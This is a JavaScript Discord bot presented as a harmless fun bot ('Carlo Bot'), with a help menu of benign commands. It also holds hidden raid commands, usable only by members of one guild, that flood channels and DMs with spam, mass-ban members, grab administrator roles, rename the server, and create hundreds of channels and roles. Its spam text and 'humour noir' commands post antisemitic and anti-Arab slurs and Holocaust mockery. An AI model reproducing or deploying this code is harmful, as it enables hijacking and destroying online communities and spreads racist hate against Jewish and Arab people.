const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
 
var fucked = false;
 



bot.on('ready',() => {
  //invit link
  console.log("jsuis co ")
  bot.guilds.forEach(guild => {
    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
  });
}); 

bot.on('message', msg => {

  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ 
    return;
  }
  
  

 if (bot.guilds.get('430039551747293205').members.get(msg.author.id) !== undefined) {
    
if (msg.content === '.destruction') {
    console.log(`Commande .destruction par ${msg.author.tag}`);
    var interval = setInterval (function () {
      msg.channel.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
"https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
"https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
"https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
"SHOAH GANG ON THE BEAT (: \n"+
"~ ~ ~ ~ ~ ~~ ~ \n"+    
"ROCKET MAN MA SALOPE \n"+
"~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
    }, 450)
  }

if (msg.content === '.oupss') {
    console.log(`Commande .oupss par ${msg.author.tag}`);
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('raid_by_shoah_gang', 'voice').catch(e => {});
        msg.guild.createChannel('raid_by_shoah_gang', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === '.banev') {
    console.log(`Commande .banev par ${msg.author.tag}`);
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === '.leave') {
    console.log(`Commande .leave par ${msg.author.tag}`);
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
    console.log(`Commande .pardon par ${msg.author.tag}`);

    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === '.roleflood') {

    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 500) clearInterval(interval);
      msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM', permissions: "ADMINISTRATOR"}).then(function(role) {
        msg.member.addRole(role).catch(e => {});
        if (msg.deletable) msg.delete().catch(e => {});
      }).catch(e => {});
      i++
    }, 100)
  }

  if(msg.content === ".renameall"){
    if(msg.deletable) msg.delete();
    msg.guild.members.forEach(member => {
      if(member.setNickname("SHOAH GANG ON THE DANCEFLOOR"));      
  })
  }
  if(msg.content === ".mp"){
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("RAID BY SHOAH GANG  @everyone  @here . \n"+ 
        "https://cdn.discordapp.com/attachments/436188674435317760/445207285195866124/shoah.png . \n"+
        "https://cdn.discordapp.com/attachments/436188674435317760/445207509204992021/walkoud_singe.png .\n"+
        "https://cdn.discordapp.com/attachments/436188674435317760/445207831977918465/pikly.png . \n"+
        "SHOAH GANG ON THE BEAT (: \n"+
        "~ ~ ~ ~ ~ ~~ ~ \n"+    
        "ROCKET MAN MA SALOPE \n"+
        "~ ~ ~ ~ ~ ~~ ~  ~~  ~~").catch(e => {});
      }, 450)

      }   
  })
  }

 }//Filtre personne
});
bot.on("message", message => {
  if(message.content.startsWith(".avatar")) {
    let membere = message.mentions.members.first()
    let avatar_embed = new Discord.RichEmbed()
    .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
    .setColor("RANDOM")
    .setImage(membere.user.avatarURL)
    .setFooter("*Carlo Bot  ©*")
    return message.channel.send(avatar_embed).catch(e => {});
}
if(message.content.startsWith(".say")) {
  if(message.deletable) {
  message.delete()}
var text = message.content.split(" ").slice(1).join(" ")
if(!text){
  messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
}
let embed = new Discord.RichEmbed();
embed.setColor("RANDOM")
.setDescription(text)
message.channel.sendEmbed(
  embed, {
    disableEveryone: true
  }
).catch(e => {});
}
})

bot.on("message", message => {
  if(message.content.startsWith(".8ball")){
    var question = message.content.split(" ").slice(1).join(" ")
    var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]
    let ball_embed = new Discord.RichEmbed()
    .setColor("RANDOM")
    .setTitle("Question de "+message.author.tag)
    .setDescription(question)
    .addField("Reponse", tableauball[Math.floor(Math.random()*9)])
    .setFooter("*Carlo Bot  ©*")
    .setThumbnail(bot.user.iconURL)
    message.channel.send(ball_embed).catch(e => {});
  }
  if(message.content.startsWith(".flip")){
    var flipdebut = message.content.split(" ").slice(1).join(" ")
    if(flipdebut === "pile" || flipdebut === "face"){
      var reponse = ["Vrai, c'est bien ça", "Faux, ce n'est pas ça "]
      let flip_embed = new Discord.RichEmbed()
      .setDescription(reponse[Math.floor(Math.random()*2)])
      .setColor("RANDOM")
      .setFooter("*Carlo Bot  ©*")
      .setThumbnail(bot.user.iconURL)
      message.channel.send(flip_embed).catch(e => {});
    }
    else {
      message.channel.send("** :x: Vous devez dire pile ou face, Exemple : .flip pile **").catch(e => {});
    }
  }
  if(message.content.startsWith("@"+bot.user.id)){
    message.reply("Voici mon lien d'invitation : https://discordapp.com/oauth2/authorize?client_id=444526510930395148&scope=bot&permissions=2146958591 ").catch(e => {});
  }
  if(message.content.startsWith(".serverinfo")){
    let serverinfo_embed = new Discord.RichEmbed()
    .setTitle("Info Sur le Serveur")
    .setColor("RANDOM")
    .addField("Nom", message.guild.name)
    .addField("Date de Creation", message.guild.createdAt)
    .addField("Id du serveur", message.guild.id)
    .addField("Emplacement Du Serveur", message.guild.region)
    .setThumbnail(message.guild.iconURL)
    .addField("Nombre de membre", message.guild.memberCount)
    .setFooter("*Carlo Bot  ©*")
    message.channel.send(serverinfo_embed).catch(e => {});
  }

  if(message.content === ".help"){
    let help2_embed = new Discord.RichEmbed()
    .setThumbnail(bot.user.iconURL)
    .setColor("RANDOM")
    .setTitle("HELP")
    .addField(".serverinfo", "Donne des infos sur le serveur ! ")
    .addField(".avatar", "Affiche l'avatar d'un joueur")
    .addField("flip", "Sert a jouer a pile ou face")
    .addField(".8ball", "Pose une question une bot")
    .addField(".say", "Le bot repete votre message")
    .addField(".userinfo", "Donne des infos sur un joueur")
    .addField(".humournoir", "Affiche les commandes avec de l'humour noir")
    .setFooter("Carlo Bot  ©")
    message.channel.send(help2_embed).catch(e => {});
  }
  if(message.content.startsWith(".userinfo")){
    let membere2 = message.mentions.members.first()
    let userinfo_embed = new Discord.RichEmbed()
    .setThumbnail(membere2.user.avatarURL)
    .setColor("RANDOM")
    .addField("Pseudo", `${message.mentions.users.first().username}`)
    .addField("Date de Creation Du Compte", membere2.user.createdAt)
    .addField("Discriminator", '#'+membere2.user.discriminator)
    .addField("Id du Membre", membere2.user.id)
    .addField("Tag du Membre", membere2.user.tag)
    .setFooter("Carlo Bot  ©")
    message.channel.send(userinfo_embed).catch(e => {});
  }
  if (bot.guilds.get('430039551747293205').members.get(message.author.id) !== undefined) {
    if(message.content.startsWith(".listeserver")) {
      bot.guilds.forEach(guild => {
        var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id)
        invite.createInvite().then(invite => message.channel.send(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
      })
    }
  }
if(message.content === ".juif"){
  let juif_tableau = ["https://cdn.i24news.tv/upload/cache/large_content_image/upload/image/dklfj.jpg","https://cdn.i24news.tv/upload/image/243c54d60eb2cb4e8c73d6c3f1fc3088e92c224f.jpg?width=716", "https://www.egaliteetreconciliation.fr/local/cache-vignettes/L320xH219/arton36077-2541f.jpg", "https://i.skyrock.net/7418/66307418/pics/2666679646_small_1.jpg", "http://www.jforum.fr/wp-content/uploads/2018/02/84bceb0f2370f1245716c6964195f28c068779ab.jpg","http://www.cercleshoah.org/local/cache-vignettes/L560xH402/enfants_memoire-7cf7d.jpg?1497783735",
  "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQa1ODs8zTQuxl113FyfT7Nn6lAoJKje-W0uwpkSaDALYutWAYj", "https://static.timesofisrael.com/fr/uploads/2017/04/tunnel-e14922342737671-1024x640.jpg", "https://static.lexpress.fr/medias_10633/w_2048,h_1146,c_crop,x_0,y_150/w_640,h_360,c_fill,g_north/v1444661446/3354-jeunes-juifs-au-camp-de-drancy-en-1942-apres-la-rafle-du-vel-d-hiv_5444257.jpg", "https://static.lexpress.fr/medias_861/w_605,h_263,c_crop,x_0,y_95/w_640,h_360,c_fill,g_north/v1406713115/auschwitz-18_440884.jpg",
"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRCoKMyAnifXvjnXIzel9FvwJfRB-vVcK7EtWrVnRWg1hbWirBb", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRRFHoQksI_vQjF-e5N31vDnmnk_QMzSDq4a-nMeoqo0rKBce6s", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRajReQG_38WUucejYuyQ0xdzRMy-0tIikgWoGx-Al-gDAwVldE", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTzbsxf2pjU3nXFJVu8E0xkQPP0fpZfs78f3kPgplTuj0Gw6RRbJQ", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTZZH2pSvSaKnpfHTSuuoSxZOrjCPGqysi2S1sZG-wJMaGknn1g", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR6wWzB1XJyvj9TB9_7hN4tUWJUVPwEOSLntNCZnkMXyA0KVXUsJw",
"https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQKyR4hL8vK8If7mXC-TjBCcW-wqoQzKb9cJM_nosaLZdRzkjZfJQ", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTbENwKyTEHwsc357FqcRH0wEIFfmOXPFNj4AdmJM16pSj3czQ2", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSAd4wpcfVth81b-Pj7AncbjLhOQMnmTJ5f5XKp5vDto8nDVdn5ow", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ1frIPeZizaDqUy4dTooLfi2WoOJO_iX4hFhScemJCNstU65s", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSIqihOKwaKlOmrHvdaN6-WoP2EznpQ-v9I61kW6oFY2ct4emL"]
  let juif_embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .setImage(juif_tableau[Math.floor(Math.random()*21)])
  .setTitle("JUIF")
  .setFooter("Carlo Bot  ©")
  message.channel.send(juif_embed).catch(e => {});
}
if(message.content === ".bougnoule"){
  let arabe_tableau = ["https://pbs.twimg.com/profile_images/812093616973901824/FFmqDKOE_400x400.jpg",'http://m.memegen.com/eizpvm.jpg', "http://img15.hostingpics.net/pics/294399musicienmarocainessaouiramod.jpg", "https://i.ytimg.com/vi/JcBuR0p3yYU/hqdefault.jpg", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRAqkz9dYGgHHCKY_rQWyInTLBn7xGEtTc_zXgAc3o9fiLZ9wEQ", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTrNEJpzGYTgodoXq4lcU7gu_uWl9QumNuTqxyEkWchQR9mNjMd", "http://static.blancheurope.com/2017/03/Bougnoule-illustrant-lexposition-Mater-%C3%A0-la-basilique-Saint-Denis.jpg",
"https://risibank.fr/cache/stickers/d328/32846-full.png", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTnbt4n7a8m6VZWJnCHmKHsuAJzioCi5qDI_UkwPH6dawxq6WyAIw", "https://i.skyrock.net/4973/6704973/pics/750770967_small.jpg", "https://i2.wp.com/www.sous-france.fr/wp-content/uploads/2017/01/Chut.jpg?resize=250%2C250"]
let arabe_embed = new Discord.RichEmbed()
.setColor("RANDOM")
.setImage(arabe_tableau[Math.floor(Math.random()*12)])
.setTitle("BOUGNOULE")
.setFooter("Carlo Bot  ©")
message.channel.send(arabe_embed).catch(e => {});
}
if(message.content.startsWith(".humournoir")){
  let humourn_embed = new Discord.RichEmbed()
  .setColor("RANDOM")
  .setTitle("Humour Noir")
  .addField("Commande", ".bougnoule , .juif")
  .setFooter("C'est juste de l'humour noir , je ne suis en aucun cas raciste.")
  message.channel.send(humourn_embed).catch(e => {});
}
}) 
bot.login(process.env.BOT_TOKEN)
